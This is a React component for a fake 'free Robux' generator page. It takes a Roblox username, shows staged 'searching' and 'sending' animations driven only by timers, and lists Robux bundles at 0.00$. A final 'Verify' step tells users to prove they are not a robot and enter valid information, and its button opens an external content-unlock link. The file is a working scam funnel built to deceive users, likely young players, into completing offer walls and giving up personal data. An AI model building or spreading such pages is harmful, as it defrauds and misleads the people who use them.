"use client";
import React, { useState } from "react";
import Image from "next/image";

enum STEPS {
  userName = 1,
  searchingAnimation = 2,
  getRobux = 3,
  sendingAnimation = 4,
  finalStep = 5,
}

const GetRobux = () => {
  const [username, setUsername] = useState("");
  const [step, setStep] = useState(STEPS.userName);
  const [selectedRobux, setSelectedRobux] = useState(null);
  const handleSelectedRobux = (robuxAmount) => {
    setSelectedRobux(robuxAmount);
    setStep(STEPS.sendingAnimation);
    setTimeout(() => setStep(STEPS.finalStep), 2500);
  };
  const handleChange = (e) => {
    setUsername(e.target.value);
  };

  const handleGetRobuxClick = () => {
    if (username.trim().length <= 2) {
      alert("Please enter a valid username");
    } else {
      setStep(STEPS.searchingAnimation);
      setTimeout(() => setStep(STEPS.getRobux), 2500);
    }
  };

  if (step == 2) {
    console.log("searching animation");
  }
  return (
    <div className="box_con">
      {step === STEPS.userName && (
        <div className="box">
          <h3>Roblox username</h3>
          <br />
          <input
            className="username"
            type="text"
            placeholder="Enter username"
            value={username}
            onChange={handleChange}
          />
          <br />
          <button className="getrbx" onClick={handleGetRobuxClick}>
            Get Robux
          </button>
        </div>
      )}

      {step === STEPS.searchingAnimation && (
        <div className="box2">
          <div className="folding">
            <div className="sk-cube1 sk-cube"></div>
            <div className="sk-cube2 sk-cube"></div>
            <div className="sk-cube4 sk-cube"></div>
            <div className="sk-cube3 sk-cube"></div>
            <div className="square"></div>
          </div>
          <p
            className="useroutput"
            style={{ textAlign: "center", marginTop: "30px" }}
          >
            Searching for <b>{username}</b>...
          </p>
        </div>
      )}
      {step === STEPS.sendingAnimation && (
        <div className="box2">
          <div className="folding">
            <div className="sk-cube1 sk-cube"></div>
            <div className="sk-cube2 sk-cube"></div>
            <div className="sk-cube4 sk-cube"></div>
            <div className="sk-cube3 sk-cube"></div>
            <div className="square"></div>
          </div>
          <p
            className="useroutput"
            style={{ textAlign: "center", marginTop: "30px" }}
          >
            Sending Robux to <b>{username}</b>...
          </p>
        </div>
      )}

      {step === STEPS.getRobux && (
        <div className="">
          <h3>Select Robux Amount</h3>
          <div className="robux-options flex flex-col gap-5">
            {[800, 1700, 5500, 20000].map((robux, index) => (
              <div
                key={index}
                className={`robux-option cursor-pointer ${
                  selectedRobux === robux ? "selected" : ""
                }`}
                onClick={() => handleSelectedRobux(robux)}
              >
                <div className="font-bold ">0.00$</div>
                <div className="robux-amount-container">
                  <span className="robux-amount">{robux}</span>
                  <span className="robux-icon-container">
                    <Image
                      src="/images/robux-removebg-preview.png"
                      alt="Robux icon"
                      width={30}
                      height={30}
                      className="robux-icon"
                    />
                  </span>
                </div>
                {selectedRobux === robux && (
                  <span className="selected-indicator">Selected</span>
                )}
              </div>
            ))}
          </div>
        </div>
      )}

      {step === STEPS.finalStep && (
        <div className="box4">
          <h3>Final step!</h3>
          <p>
            Sending Robux to <b>{username}</b>...
          </p>
          <p>
            Please verify that you are not a robot by answering a few questions
            to receive your Robux! Please enter valid information for the robux
            to go through. Take your time as if you complete it there will be
            bonus robux as a reward!
          </p>
          <button
            onClick={() =>
              window.open("https://content-unlock.com/getfreebux~623910D")
            }
            style={{ fontSize: "19px" }}
          >
            Verify
          </button>
        </div>
      )}
    </div>
  );
};

export default GetRobux;
